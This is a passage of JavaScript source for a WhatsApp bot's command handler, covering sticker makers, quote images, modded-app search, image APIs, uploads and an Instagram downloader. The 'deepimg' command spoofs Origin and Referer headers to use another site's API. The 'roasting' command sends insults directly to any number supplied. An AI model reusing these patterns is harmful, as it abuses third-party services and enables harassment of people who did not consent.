              return [];
            }
          }
          if (!text) return xreply("what app do you want to search? \n\n *Example:*.hmod Minecraft");
          client.sendMessage(m.chat, {
            react: {
              text: `⏱️`,
              key: m.key
            }
          });
          try {
            const data = await getMod(text);
            if (data.length === 0) {
              return xreply('Gak Ketemu');
            }
            let teks = `*[ Happymod Search]*\n\n`;
            for (let i = 0; i < Math.min(data.length, 15); i++) {
              teks += `*${i + 1}. ${data[i].title}*\n`;
              teks += `Rating : ${data[i].rate}\n`;
              teks += `Link : ${data[i].link}\n\n`;
            }
            await client.sendMessage(m.chat, {
              image: {
                url: "https://i.postimg.cc/c6q7zRC8/1741529921037.png"
              },
              caption: teks
            });
          } catch (error) {
            console.error(error);
            xreply('Error');
          }
        }
        break;
      case 'deepimg':
        {
          if (!text) return xreply("Enter prompt image.");
          xreply("processing the image, please wait...");
          try {
            const axios = require('axios');
            let {
              data
            } = await axios.post("https://api-preview.chatgot.io/api/v1/deepimg/flux-1-dev", {
              prompt: text,
              size: "1024x1024",
              device_id: `dev-${Math.floor(Math.random() * 1000000)}`
            }, {
              headers: {
                "Content-Type": "application/json",
                Origin: "https://deepimg.ai",
                Referer: "https://deepimg.ai/"
              }
            });
            let imageUrl = data?.data?.images?.[0]?.url;
            if (!imageUrl) return xreply("failed to create image. try changing the prompt.");
            await client.sendMessage(m.chat, {
              image: {
                url: imageUrl
              },
              caption: `🖼️ *image success Created!*
📜 *Prompt:* ${text}`
            }, {
              quoted: m
            });
          } catch (err) {
            console.error(err.response ? err.response.data : err.message);
            xreply("an error occurred during processing image.");
          }
        }
        break;

      /// ───────────── [ 𝖲𝗍𝗂𝖼𝗄𝖾𝗋 𝖲𝖾𝖺𝗋𝖼𝗁 ] ──────────── ///
      case "searchsticker":
        {
          if (!text) return xreply("which sticker are you looking for?");
          Reply("_Searching for the sticker..._");
          try {
            let apiUrl = `https://api.agatz.xyz/api/sticker?message=${encodeURIComponent(text)}`;
            const res = await fetch(apiUrl);
            const response = await res.json();
            if (!response.data?.sticker_url || response.data.sticker_url.length === 0) {
              return xreply("not found sticker matching");
            }
            const packNames = ["Sticker Keren ", "Sticker Funny ", "Created ", "Special Sticker ", "Random Sticker ", "Koleksi Sticker ", "Sticker Pack ", "Daily Sticker ", "Magic Sticker ", "Cute Sticker "];
            let packInfo = `*Search results Sticker ${text}*\n` + `- *Title:* ${response.data.title}\n` + `- *Creator:* ${response.creator}\n` + `- *Sticker count:* ${response.data.sticker_url.length}\n` + `_Sending the sticker, please wait..._`;
            await client.sendMessage(m.chat, {
              text: packInfo
            }, {
              quoted: m
            });
            let allStickers = [...response.data.sticker_url];
            allStickers.sort(() => Math.random() - 0.5);
            const maxStickers = Math.min(10, allStickers.length);
            let successCount = 0;
            let attemptCount = 0;
            while (successCount < maxStickers && attemptCount < allStickers.length) {
              try {
                const stickerUrl = allStickers[attemptCount];
                const randomPackname = packNames[Math.floor(Math.random() * packNames.length)];
                await client.sendAsSticker(m.chat, stickerUrl, m, {
                  packname: randomPackname,
                  author: `By ${global.namaOwner}`
                });
                successCount++;
                await new Promise(resolve => setTimeout(resolve, 500));
              } catch (stickerError) {
                console.log(`Error sending sticker:`, stickerError);
              }
              attemptCount++;
            }
            if (successCount < maxStickers) {
              xreply(`successfully sent ${successCount} sticker from ${maxStickers} tried`);
            } else if (response.data.sticker_url.length > 10) {
              xreply(`Showing ${successCount} sticker random from ${response.data.sticker_url.length} sticker found`);
            }
          } catch (e) {
            console.error('Error in stickersearch:', e);
            xreply("an error occurred while searching for sticker");
          }
        }
        break;

      /// ───────────── [ 𝖰𝖢 𝖬𝖺𝗄𝖾𝗋 ] ──────────── ///
      case "qc":
        {
          if (!text) return reply(example('teksnya'));
          let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"];
          var ppuser;
          try {
            ppuser = await client.profilePictureUrl(m.sender, 'image');
          } catch (err) {
            ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg';
          }
          const json = {
            "type": "quote",
            "format": "png",
            "backgroundColor": "#000000",
            "width": 812,
            "height": 968,
            "scale": 2,
            "messages": [{
              "entities": [],
              "avatar": true,
              "from": {
                "id": 1,
                "name": m.pushName,
                "photo": {
                  "url": ppuser
                }
              },
              "text": text,
              "replyMessage": {}
            }]
          };
          const response = axios.post('https://bot.lyo.su/quote/generate', json, {
            headers: {
              'Content-Type': 'application/json'
            }
          }).then(async res => {
            const buffer = Buffer.from(res.data.result.image, 'base64');
            let tempnya = "./library/database/sampah/" + m.sender + ".png";
            await fs.writeFile(tempnya, buffer, async err => {
              if (err) return xreply("Error");
              await client.sendAsSticker(m.chat, tempnya, m, {
                packname: global.packname
              });
              await fs.unlinkSync(`${tempnya}`);
            });
          });
        }
        break;
      case 'createquote':
        {
          if (!text) return xreply("send the quote text!\nexample:.quoteimg do not never give up, bro.");
          const {
            createCanvas,
            loadImage
          } = require('canvas');
          function wrapText(ctx, text, maxWidth) {
            const words = text.split(' ');
            let lines = [];
            let currentLine = words[0];
            for (let i = 1; i < words.length; i++) {
              const word = words[i];
              const width = ctx.measureText(currentLine + ' ' + word).width;
              if (width < maxWidth) {
                currentLine += ' ' + word;
              } else {
                lines.push(currentLine);
                currentLine = word;
              }
            }
            lines.push(currentLine);
            return lines;
          }
          async function generateQuoteImage(ppUrl, username, quoteText) {
            const width = 1000;
            const height = 500;
            const canvas = createCanvas(width, height);
            const ctx = canvas.getContext('2d');
            ctx.fillStyle = '#000000';
            ctx.fillRect(0, 0, width, height);
            const avatar = await loadImage(ppUrl);
            ctx.save();
            ctx.beginPath();
            ctx.arc(180, 250, 120, 0, Math.PI * 2, true);
            ctx.closePath();
            ctx.clip();
            ctx.drawImage(avatar, 60, 130, 240, 240);
            ctx.restore();
            ctx.fillStyle = '#ffffff';
            ctx.font = '28px sans-serif';
            let lines = wrapText(ctx, quoteText, 600);
            lines.forEach((line, i) => {
              ctx.fillText(line, 350, 180 + i * 35);
            });
            ctx.fillStyle = '#aaaaaa';
            ctx.font = '22px italic';
            ctx.fillText(`- ${username}`, 350, 180 + lines.length * 35 + 10);
            return canvas.toBuffer();
          }
          let pushname = m.pushName || m.sender.split('@')[0];
          let ppUrl = await client.profilePictureUrl(m.sender, 'image').catch(() => 'https://img1.pixhost.to/images/5375/593382185_biyuofficial.jpg');
          let buffer = await generateQuoteImage(ppUrl, pushname, text);
          await client.sendMessage(m.chat, {
            image: buffer,
            caption: `📝 Quote from *${pushname}*\n\n> Biyu`,
            contextInfo: {
              mentionedJid: [m.sender]
            }
          }, {
            quoted: m
          });
        }
        break;
      case 'quoteimg':
        {
          if (!q) return xreply("send the quote text first.\nexample:.quoteimg do not give up , you great ");
          try {
            const {
              createCanvas,
              loadImage
            } = require('canvas');
            const axios = require('axios');
            const width = 1000;
            const height = 500;
            const canvas = createCanvas(width, height);
            const ctx = canvas.getContext('2d');
            ctx.fillStyle = '#ffffff';
            ctx.fillRect(0, 0, width, height);
            const avatarUrl = await client.profilePictureUrl(m.sender, 'image');
            const avatarBuffer = (await axios.get(avatarUrl, {
              responseType: 'arraybuffer'
            })).data;
            const avatarImg = await loadImage(avatarBuffer);
            ctx.drawImage(avatarImg, 60, 130, 240, 240);
            ctx.fillStyle = '#000000';
            ctx.font = '40px sans-serif';
            function wrapText(text, maxWidth) {
              const words = text.split(' ');
              let lines = [];
              let line = '';
              for (const word of words) {
                const testLine = line + word + ' ';
                const metrics = ctx.measureText(testLine);
                if (metrics.width > maxWidth && line) {
                  lines.push(line.trim());
                  line = word + ' ';
                } else {
                  line = testLine;
                }
              }
              if (line) lines.push(line.trim());
              return lines;
            }
            const maxTextWidth = 600;
            const lines = wrapText(q, maxTextWidth);
            let y = 180;
            for (const line of lines) {
              ctx.fillText(line, 350, y);
              y += 55;
            }
            ctx.fillStyle = '#505050';
            ctx.font = '30px sans-serif';
            ctx.fillText(`- ${m.pushName || m.sender.split('@')[0]}`, 350, y + 20);
            const buffer = canvas.toBuffer('image/png');
            await client.sendMessage(m.chat, {
              image: buffer,
              caption: 'Here is your quote~'
            }, {
              quoted: m
            });
          } catch (err) {
            console.error(err);
            xreply("an error occurred during fetching the profile photo or creating the image.");
          }
        }
        break;

      /// ───────────── [ 𝖥𝗎𝗇 & 𝖦𝖺𝗆𝖾 𝖳𝖾𝗄𝗌 ] ──────────── ///
      case 'cekgila':
        {
          const nama = text || m.pushName || "you";
          const persen = Math.floor(Math.random() * 101);
          const komentar = ["Normal... like a brick.", "A bit odd, but still worth talking to.", " starting to act up, please handle it.", "wow, this is absolutely hilarious.", 'God tier... crazy but cool.', "Crazy, even the bot gets a headache reading your chat.", "It seems enggak can saved 😭", "you are sane, but only while asleep.", "Quietly insane... scary.", 'Insane with a professional style. Respect.'];
          const kata = komentar[Math.floor(Math.random() * komentar.length)];
          xreply(`🧠 *today's insanity test*

📝 name: *${nama}*\n📊 Tingkat Crazy: *${persen}%*\n🗯️ Komentar: *${kata}*`);
        }
        break;
      case 'jodoh':
        {
          if (!text.includes('|')) return xreply("example:.match John|Jane");
          const [nama1, nama2] = text.split('|');
          const persen = Math.floor(Math.random() * 100) + 1;
          xreply(`❤️ Compatibility between *${nama1.trim()}* and *${nama2.trim()}* is *${persen}%*`);
          break;
        }
      case 'serfikat':
        {
          if (!text) return xreply(`send the command *${command} [text]*

example: *${command} Hilman*`);
          try {
            let url = `https://api.sxtream.xyz/maker/yapping?name=${encodeURIComponent(text)}`;
            let res = await fetch(url);
            if (!res.ok) throw "❌ failed to fetch data from API.";
            let buffer = await res.buffer();
            await client.sendFile(m.chat, buffer, 'srtdarksistem.jpg', `🗣️ Sertifikat Dark Sistem by *${text}*`, m);
          } catch (e) {
            console.error(e);
            xreply("❌ an error occurred while fetching image.");
          }
        }
        break;
      case "motivasi":
        {
          try {
            let res = await fetch('https://veloria-ui.vercel.app/random/motivasi');
            let data = await res.json();
            if (!data || !data.quotes) return xreply("❌ failed to fetch quote.");
            let quote = `📜 *Quote of the Day*\n\n"${data.quotes}"\n\n📝 _Akoya-MD_`;
            client.sendMessage(m.chat, {
              text: quote
            }, {
              quoted: m
            });
          } catch (e) {
            console.error(e);
            xreply("❌ an error occurred while fetching data.");
          }
        }
        break;
      case "bedtime story":
        {
          try {
            const res = await fetch('https://apizell.web.id/random/dongeng');
            const json = await res.json();
            let caption = `*${json.title}*\n_By ${json.author}_\n\n${json.storyContent.replace(/<[^>]*>/g, '').trim()}\n\n*Nasihat:* ${json.storyContent.split('Nasihat :')[1]?.trim() || '-'}`;
            client.sendMessage(m.chat, {
              image: {
                url: json.image
              },
              caption: caption
            }, {
              quoted: m
            });
          } catch (e) {
            xreply("failed to fetch bedtime story. try again later.");
            console.error(e);
          }
        }
        break;
      case 'jarak':
      case 'rute':
      case 'cekjarak':
      case 'cekrute':
        {
          if (!text.includes(',')) return xreply("wrong format! Usage: distance [origin city],[destination city]\nexample: distance bekasi,madiun");
          let [from, to] = text.split(',').map(v => v.trim());
          let biyumaunyepong = `https://api.vreden.my.id/api/tools/jarak?from=${encodeURIComponent(from)}&to=${encodeURIComponent(to)}`;
          try {
            let response = await fetch(biyumaunyepong);
            let data = await response.json();
            if (data.status !== 200) return xreply("failed to get data distance! Make sure kota inserted correct.");
            let result = data.result;
            let msg = `📍 *Information Distance* 📍
 
🚗 *From:* ${result.asal.alamat} 
📍 *To:* ${result.tujuan.alamat} 
📏 *Distance:* ${result.detail.split('menempuh jarak ')[1].split(',')[0]} 
⏳ *estimated time:* ${result.detail.split("estimated time ")[1]} 
⛽ *Estimasi BBM:* ${result.estimasi_biaya_bbm.total_liter} liter (~${result.estimasi_biaya_bbm.total_biaya})

🗺️ *Peta:* ${result.peta_statis}

📍 *Route:* 
${result.arah_penunjuk_jalan.map(step => `🚘 ${step.instruksi} (${step.jarak})`).join('\n')}`;
            xreply(msg);
          } catch (e) {
            console.error(e);
            xreply("an error occurred while fetching data!");
          }
        }
        break;

      /// ───────────── [ 𝖱𝖺𝗇𝖽𝗈𝗆 𝖦𝖺𝗆𝖻𝖺𝗋 ] ──────────── ///
      case "kucing":
      case "cat":
      case "randomkucing":
        {
          await xreply(mess.wait);
          try {
            const axios = require('axios');
            let anu = `https://api.siputzx.my.id/api/r/cats`;
            const response = await axios.get(anu, {
              responseType: 'arraybuffer'
            });
            client.sendMessage(m.chat, {
              image: Buffer.from(response.data),
              caption: "successfully fetched"
            }, {
              quoted: m
            });
          } catch (e) {
            console.log(e);
            await xreply("Error");
          }
        }
        break;
      case "cecan":
      case "cn":
        {
          await client.sendMessage(m.chat, {
            react: {
              text: '🔎',
              key: m.key
            }
          });
          const apiEndpoints = {
            "Indonesia 🇮🇩": "https://api.siputzx.my.id/api/r/cecan/indonesia",
            "China 🇨🇳": "https://api.siputzx.my.id/api/r/cecan/china",
            "Japan 🇯🇵": "https://api.siputzx.my.id/api/r/cecan/japan",
            "Korea 🇰🇷": "https://api.siputzx.my.id/api/r/cecan/korea",
            "Thailand 🇹🇭": "https://api.siputzx.my.id/api/r/cecan/thailand",
            "Vietnam 🇻🇳": "https://api.siputzx.my.id/api/r/cecan/vietnam"
          };
          try {
            const axios = require('axios');
            let araara = new Array();
            const imagesPerCountry = 2;
            for (const [country, url] of Object.entries(apiEndpoints)) {
              for (let i = 0; i < imagesPerCountry; i++) {
                try {
                  const response = await axios.get(url, {
                    responseType: 'arraybuffer'
                  });
                  let imgsc = await prepareWAMessageMedia({
                    image: Buffer.from(response.data)
                  }, {
                    upload: client.waUploadToServer
                  });
                  araara.push({
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                      hasMediaAttachment: true,
                      ...imgsc
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                      buttons: [{
                        "name": "cta_url",
                        "buttonParamsJson": `{\"display_text\":\"${country} Image ${i + 1}\",\"url\":\"${url}\",\"merchant_url\":\"https://www.google.com\"}`
                      }]
                    })
                  });
                  await new Promise(resolve => setTimeout(resolve, 500));
                } catch (error) {
                  console.error(`Error processing image ${i + 1} for ${country}:`, error);
                  continue;
                }
              }
            }
            if (araara.length === 0) {
              throw new Error('No valid images found');
            }
            const msgii = await generateWAMessageFromContent(m.chat, {
              viewOnceMessageV2Extension: {
                message: {
                  messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                  },
                  interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                      text: `
Koleksi Cecan from Various Negara

• Indonesia 🇮🇩
• China 🇨🇳
• Japan 🇯🇵
• Korea 🇰🇷
• Thailand 🇹🇭
• Vietnam 🇻🇳
`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                      cards: araara
                    })
                  })
                }
              }
            }, {
              userJid: m.sender,
              quoted: m
            });
            await client.relayMessage(m.chat, msgii.message, {
              messageId: msgii.key.id
            });
            await client.sendMessage(m.chat, {
              react: {
                text: '✅',
                key: m.key
              }
            });
          } catch (error) {
            console.error('Error:', error);
            await client.sendMessage(m.chat, {
              react: {
                text: '❌',
                key: m.key
              }
            });
            return xreply("an error occurred while fetching image. please try again.");
          }
        }
        break;
      case 'cogan':
        {
          try {
            const res = await fetch('https://raw.githubusercontent.com/veann-xyz/result-daniapi/main/cecan/cogan.json');
            const data = await res.json();
            if (!Array.isArray(data)) return xreply("Data invalid.");
            const randomImage = data[Math.floor(Math.random() * data.length)];
            client.sendMessage(m.chat, {
              image: {
                url: randomImage
              },
              caption: "Here you go, bro:v"
            }, {
              quoted: m
            });
          } catch (err) {
            console.error(err);
            xreply("failed to fetch data cogan.");
          }
        }
        break;

      /// ───────────── [ 𝖱𝗈𝖺𝗌𝗍𝗂𝗇𝗀 ] ──────────── ///
      case 'roasting':
        {
          let orang = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null;
          if (!orang) return xreply("tag someone or type their number, example: *.roast @user* or *.roast 628xxxx*");
          let ppthumb;
          try {
            ppthumb = await client.profilePictureUrl(orang, 'image');
          } catch {
            // no profile picture to show: fall back to the bundled brand art
            ppthumb = /^https?:\/\//.test(String(global.image.menu)) ? global.image.menu : null;
          }
          const roastList = [`@user, sometimes I think, you are like a 1-bar signal in the middle of a forest—useless, but always showing up when no one needs you.`, `@user, you like charger 15 ribuan—can used, tapi bikin panas and ngerusak everything.`, `@user, if your brain were sold on a marketplace, would probably be listed under "rusak parah, sold by the kilo".`, `@user, you like WiFi tetangga—kelihatan tapi nggak can used. Ngeselin!`, `@user, if ngomong like a remixed song—lots of noise but no clear point.`, `@user, you not exactly toxic — more like hazardous waste that should be quarantined for 40 years.`, `@user, your lifestyle is like a 9th-semester thesis: going nowhere, full of excuses, zero results.`, `@user, you are like an unsolvable CAPTCHA, only ever annoying people.`, `@user, if you were a game character, you would be the NPC handing out failed quests from the start.`, `@user, honestly... every time you open your mouth, the room's IQ drops 10 points.`, `@user, muka you like error 404—nggak ketemu the solution, bikin stres.`, `@user, as an animal, you would definitely be a mythical creature, nobody understands your existence.`, `@user, you are like a 5 AM alarm on a holiday, pointless, just ruins peoples sleep.`, `@user, your IQ is like red ping: high but useless.`, `@user, you are like a corrupt file — opening it is infuriating, deleting it wastes your data.`, `@user, if being a burden were a contest, you would be champion five years running.`, `@user, jokes you like sinetron azab—maksa, basi, tapi tetep aja nongol.`, `@user, ngomong sama you like ngisi CAPTCHA terus failed, muter-muter gak jelas.`, `@user, if your laugh were recorded, it could be used to scare off ghosts.`, `@user, gaya you like intro YouTuber 2012—lebay, norak, and pengen skip.`, `@user, you are like a broken charger, it connects, but it shocks peoples feelings.`, `@user, every time you show up, the vibe errors out like Windows—tiba-tiba, bikin panik, and nyusahin.`, `@user, you are like a deactivated WiFi password, still remembered, but useless.`, `@user, you are like a family WhatsApp group: busy, but pointless.`, `@user, if you were an app, you would need a daily update and still lag.`, `@user, your face is like a zip file, small but full of heavy stuff.`, `@user, your vibes are like a 1% battery, just waiting to be drained by lazy people.`, `@user, if you were a soap opera, it would be titled *"Rebel Child Who Forgot to Update Their Brain."*`, `@user, you are like a failed download, you waited forever, then it errored anyway.`, `@user, your brain is like a free server: down every time it is needed.`, `@user, if you were an emoji, you would be "buffering".`, `@user, IQ you like koneksi WiFi publik—all can pake, tapi nggak can reliable.`, `@user, every time you speak, grammar itself weeps.`, `@user, as a movie, you would get 1 star from both netizens and the supernatural.`, `@user, your jokes are like a 2010 Facebook status: dry, dated, and embarrassing.`];
          const roastText = roastList[Math.floor(Math.random() * roastList.length)].replace(/@user/g, `@${orang.split('@')[0]}`);
          try {
            await client.sendMessage(orang, {
              text: roastText,
              mentions: [orang],
              contextInfo: {
                externalAdReply: {
                  title: `${botname} - ${global.versi || '2.00'} ⚙️`,
                  body: `⏱ Runtime: ${runtime(process.uptime())}`,
                  ...(ppthumb ? {
                    thumbnailUrl: ppthumb
                  } : {
                    thumbnail: thumb
                  }),
                  sourceUrl: `${global.source}`
                }
              }
            });
          } catch (error) {
            console.error("error while sending message:", error);
            xreply("an error occurred while sending message, try again later.");
          }
        }
        break;

      /// ───────────── [ 𝖲𝗍𝗂𝖼𝗄𝖾𝗋 𝖬𝖺𝗄𝖾𝗋 ] ──────────── ///
      case "s":
      case "sticker":
      case "sticker":
        {
          if (!/image|video/gi.test(mime)) return xreply(example("by sending a media"));
          if (/video/gi.test(mime) && qmsg.seconds > 15) return xreply("maximum video duration is 15 seconds!");
          var image = await client.downloadAndSaveMediaMessage(qmsg);
          await client.sendAsSticker(m.chat, image, m, {
            packname: global.packname
          });
          await fs.unlinkSync(image);
        }
        break;
      case "swm":
      case "stickerwm":
      case "stikerwm":
      case "wm":
        {
          if (!text) return xreply(example("namamu by sending a media"));
          if (!/image|video/gi.test(mime)) return xreply(example("namamu by sending a media"));
          if (/video/gi.test(mime) && qmsg.seconds > 15) return xreply("maximum video duration is 15 seconds!");
          var image = await client.downloadAndSaveMediaMessage(qmsg);
          await client.sendAsSticker(m.chat, image, m, {
            packname: text
          });
          await fs.unlinkSync(image);
        }
        break;
      case "emojimix":
        {
          if (!text) return xreply(example('😀|😍'));
          if (!text.split("|")) return xreply(example('😀|😍'));
          let [e1, e2] = text.split("|");
          let brat = `https://restapi-v2.simplebot.my.id/tools/emojimix?emoji1=${encodeURIComponent(e1)}&emoji2=${encodeURIComponent(e2)}`;
          let videoBuffer = await getBuffer(brat);
          try {
            await client.sendAsSticker(m.chat, videoBuffer, m, {
              packname: global.packname
            });
          } catch {}
        }
        break;
      case "emojigif":
        {
          if (!text) return xreply(example('😍'));
          try {
            const axios = require('axios');
            let brat = `https://restapi-v2.simplebot.my.id/tools/emojitogif?emoji=${encodeURIComponent(text)}`;
            let response = await axios.get(brat, {
              responseType: "arraybuffer"
            });
            let videoBuffer = response.data;
            let stickerBuffer = await client.sendAsSticker(m.chat, videoBuffer, m, {
              packname: global.packname
            });
          } catch (err) {
            console.error("Error:", err);
          }
        }
        break;
      case 'smeme':
      case 'stickermeme':
      case 'stickmeme':
        {
          if (!/image/.test(mime)) return reply(`Reply to the photo with caption *${prefix + command} top_text|bottom_text*`);
          client.sendMessage(m.chat, {
            react: {
              text: `⏱️`,
              key: m.key
            }
          });
          let [atas, bawah] = text.split("|");
          atas = atas || "-";
          bawah = bawah || "-";
          let buffer = await client.downloadAndSaveMediaMessage(qmsg);
          if (!buffer) return reply("❌ failed downloading media!");
          const FormData = require("form-data");
          const form = new FormData();
          form.append("reqtype", "fileupload");
          form.append("fileToUpload", buffer, "image.jpg");
          let up = await axios.post("https://catbox.moe/user/api.php", form, {
            headers: form.getHeaders()
          });
          let catboxUrl = up.data;
          if (!catboxUrl.startsWith("http")) return reply("❌ failed upload to Catbox!");
          let apiUrl = `https://api-faa.my.id/faa/smeme?text_atas=${encodeURIComponent(atas)}&text_bawah=${encodeURIComponent(bawah)}&background=${encodeURIComponent(catboxUrl)}`;
          let hasil = await axios.get(apiUrl, {
            responseType: "arraybuffer"
          });
          await client.sendAsSticker(m.chat, hasil.data, m, {
            packname: global.packname,
            author: m.pushName
          });
          client.sendMessage(m.chat, {
            react: {
              text: `🤓`,
              key: m.key
            }
          });
        }
        break;
      case "brat":
        {
          if (!text) return reply(example('teksnya'));
          const axios = require('axios');
          let brat = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false&delay=500`;
          let response = await axios.get(brat, {
            responseType: "arraybuffer"
          });
          let videoBuffer = response.data;
          try {
            await client.sendAsSticker(m.chat, videoBuffer, m, {
              packname: global.packname
            });
          } catch {}
        }
        break;
      case "bratvid":
        {
          if (!text) return reply(`example: ${prefix + command} hai`);
          const words = text.split(" ");
          const tempDir = path.join(process.cwd(), 'lib');
          if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);
          const framePaths = [];
          try {
            for (let i = 0; i < words.length; i++) {
              const currentText = words.slice(0, i + 1).join(" ");
              const res = await axios.get(`https://aqul-brat.hf.space/?text=${encodeURIComponent(currentText)}`, {
                responseType: "arraybuffer"
              }).catch(e => e.response);
              const framePath = path.join(tempDir, `frame${i}.mp4`);
              fs.writeFileSync(framePath, res.data);
              framePaths.push(framePath);
            }
            const fileListPath = path.join(tempDir, "filelist.txt");
            let fileListContent = "";
            for (let i = 0; i < framePaths.length; i++) {
              fileListContent += `file '${framePaths[i]}'\n`;
              fileListContent += `duration 0.7\n`;
            }
            fileListContent += `file '${framePaths[framePaths.length - 1]}'\n`;
            fileListContent += `duration 2\n`;
            fs.writeFileSync(fileListPath, fileListContent);
            const outputVideoPath = path.join(tempDir, "output.mp4");
            execSync(`ffmpeg -y -f concat -safe 0 -i ${fileListPath} -vf "fps=30" -c:v libx264 -preset ultrafast -pix_fmt yuv420p ${outputVideoPath}`);
            await client.sendAsSticker(m.chat, outputVideoPath, m, {
              packname: 'Made By Cy,bro botz',
              author: `\nDibuat By ${m.pushName}`
            });
            framePaths.forEach(frame => {
              if (fs.existsSync(frame)) fs.unlinkSync(frame);
            });
            if (fs.existsSync(fileListPath)) fs.unlinkSync(fileListPath);
            if (fs.existsSync(outputVideoPath)) fs.unlinkSync(outputVideoPath);
          } catch (e) {
            console.error(e);
            xreply("an error occurred");
          }
        }
        break;
      case "bratgambar2":
        {
          if (!text) {
            const colorList = `
*common color code list*

*Dasar:*
• black: #000000
• white: #FFFFFF
• red: #FF0000
• green: #00FF00
• blue: #0000FF
• yellow: #FFFF00
• Cyan: #00FFFF
• Magenta: #FF00FF

*Others:*
• Abu: #808080
• Navy: #000080
• Orange: #FFA500
• Pink: #FFC0CB
• Emas: #FFD700

Format: 
*bratimg2 text | fontColor | bgColor*
example:
bratimg2 Halo World | #FF0000 | #FFFFFF
`.trim();
            return xreply(colorList);
          }
          const axios = require('axios');
          const [teks, fontColor, bgColor] = text.split("|").map(v => v?.trim());
          const finalText = teks || 'Yubi 😗😗';
          const finalFontColor = fontColor || '#000000';
          const finalBgColor = bgColor || '#FFFFFF';
          const apiUrl = `https://fastrestapis.fasturl.cloud/maker/brat/advanced?text=${encodeURIComponent(finalText)}&font=Arial&fontSize=auto&fontPosition=justify&fontBlur=3&fontColor=${encodeURIComponent(finalFontColor)}&bgColor=${encodeURIComponent(finalBgColor)}`;
          try {
            let response = await axios.get(apiUrl, {
              responseType: "arraybuffer"
            });
            let buffer = response.data;
            await client.sendAsSticker(m.chat, buffer, m, {
              packname: global.packname
            });
          } catch (err) {
            console.error("Error bratimg2:", err);
            xreply("failed to create sticker. try again later.");
          }
        }
        break;
      case "tourl":
        {
          if (!/image/.test(mime)) return xreply(example("by sending/replying with a photo"));
          let media = await client.downloadAndSaveMediaMessage(qmsg);
          const {
            ImageUploadService
          } = require('node-upload-images');
          const service = new ImageUploadService('pixhost.to');
          let {
            directLink
          } = await service.uploadFromBinary(fs.readFileSync(media), 'Akoya-md.jpg');
          let teks = directLink.toString();
          await client.sendMessage(m.chat, {
            text: teks
          }, {
            quoted: m
          });
          await fs.unlinkSync(media);
        }
        break;
      case 'tourl2':
        {
          const fetch = require('node-fetch');
          const FormData = require('form-data');
          const q = m.quoted ? m.quoted : m;
          const mimetype = (q.msg || q).mimetype || q.mediaType || '';
          if (!/webp/.test(mimetype)) {
            client.sendMessage(m.chat, {
              react: {
                text: '⏰',
                key: m.key
              }
            });
            try {
              const media = await q.download?.();
              const fileSizeInBytes = media.length;
              const fileSizeInKB = (fileSizeInBytes / 1024).toFixed(2);
              const fileSizeInMB = (fileSizeInBytes / (1024 * 1024)).toFixed(2);
              const fileSize = fileSizeInMB >= 1 ? `${fileSizeInMB} MB` : `${fileSizeInKB} KB`;
              const form = new FormData();
              form.append('reqtype', 'fileupload');
              let ext = mimetype.split('/')[1] || '';
              if (ext) ext = `.${ext}`;
              form.append('fileToUpload', media, `file${ext}`);
              const res = await fetch('https://catbox.moe/user/api.php', {
                method: 'POST',
                body: form
              });
              const result = await res.text();
              const url = result.trim();
              const caption = `🔗 URL: ${url}\n\n*Ukuran:* ${fileSize}`;
              await client.sendMessage(m.chat, {
                text: caption
              }, {
                quoted: m
              });
            } catch (e) {
              console.error(e);
              xreply(`[! ] failed uploading file. Error: ${e.message}`);
            }
          } else {
            Reply(`File *.webp* is not supported. send or reply with another file with the caption *${prefix + command}*`);
          }
        }
        break;
      case 'tourl3':
        {
          const q = m.quoted ? m.quoted : m;
          const mime = (q.msg || q).mimetype || '';
          if (!mime) return xreply("send or reply with the file/image you want to upload!");
          await client.sendMessage(m.chat, {
            react: {
              text: '⏳',
              key: m.key
            }
          });
          try {
            const buffer = await q.download();
            const fileName = q.msg?.fileName || `file_${Date.now()}.${mime.split('/')[1] || 'bin'}`;
            const formData = new FormData();
            for (let i = 0; i < 10; i++) {
              const fieldName = `file_${i}_`;
              if (i === 0) {
                formData.append(fieldName, new Blob([buffer], {
                  type: mime
                }), fileName);
              } else {
                formData.append(fieldName, '');
              }
            }
            formData.append('submitr', '[ رفع الملفات ]');
            const res = await fetch('https://top4top.io/index.php', {
              method: 'POST',
              headers: {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36'
              },
              body: formData
            });
            const html = await res.text();
            const linkRegex = /<a\s+onclick="window\.open\(this\.href,'_blank'\);return false;"\s+href="(.*?)"/gi;
            const matches = [...html.matchAll(linkRegex)];
            const links = matches.map(match => match[1]);
            if (!links.length) throw new Error("failed to get link upload.");
            const now = new Date().toLocaleDateString('en-GB', {
              day: '2-digit',
              month: 'long',
              year: 'numeric'
            });
            await xreply(`🔗 *Link*:\n${links.join('\n')}`);
            await client.sendMessage(m.chat, {
              react: {
                text: '',
                key: m.key
              }
            });
          } catch (e) {
            await client.sendMessage(m.chat, {
              react: {
                text: '',
                key: m.key
              }
            });
            xreply(`failed!
${e.message}`);
          }
        }
        break;

      /// ───────────── [ 𝖨𝖦 𝖣𝗈𝗐𝗇𝗅𝗈𝖺𝖽𝖾𝗋 ] ──────────── ///
      case "ig":
      case "instagram":
        {
          try {
            if (!text) return xreply(`example:
${prefix + command} https://www.instagram.com/reel/DaH1GCUvqVn/?igsh=xxxxx`);
            if (!text.includes("instagram.com")) return xreply("❌ link Instagram invalid!");
            await xreply("⏳ fetching media Instagram...");
            const axios = require("axios");
            const api = `https://api.azbry.com/api/download/instagram?url=${encodeURIComponent(text)}`;
            const {
              data
            } = await axios.get(api);
            if (!data.status) {
              return xreply("❌ failed to fetch media Instagram.");
            }
            let caption = `乂 *INSTAGRAM DOWNLOADER*

📦 *Type:* ${data.type || "-"}
🎬 *Total Video:* ${data.videos?.length || 0}
🖼️ *Total Photo:* ${data.images?.length || 0}

